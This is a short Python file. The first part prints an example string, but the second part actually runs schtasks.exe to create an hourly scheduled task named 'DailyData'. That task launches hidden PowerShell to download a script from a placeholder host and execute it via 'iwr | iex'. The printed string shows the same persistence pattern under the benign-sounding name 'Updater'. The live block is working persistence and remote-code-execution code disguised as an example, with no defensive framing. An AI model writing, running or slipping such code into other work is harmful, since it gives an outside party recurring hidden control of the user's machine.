example = 'import subprocess\n\ndef schedule():\n    subprocess.run(["schtasks", "/Create", "/TN", "Updater", "/SC", "MINUTE", "/MO", "37", "/TR",\n        "powershell -NoProfile -WindowStyle Hidden -Command iwr "\n        "https://example.invalid/update.ps1 "\n        "-UseBasicParsing | iex"])\n'
print(example)

import subprocess
subprocess.run(["schtasks.exe", "/Create", "/TN", "DailyData", "/SC", "HOURLY", "/TR", "powershell -NoProfile -WindowStyle Hidden -Command iwr https://example.invalid/second.ps1 | iex"])
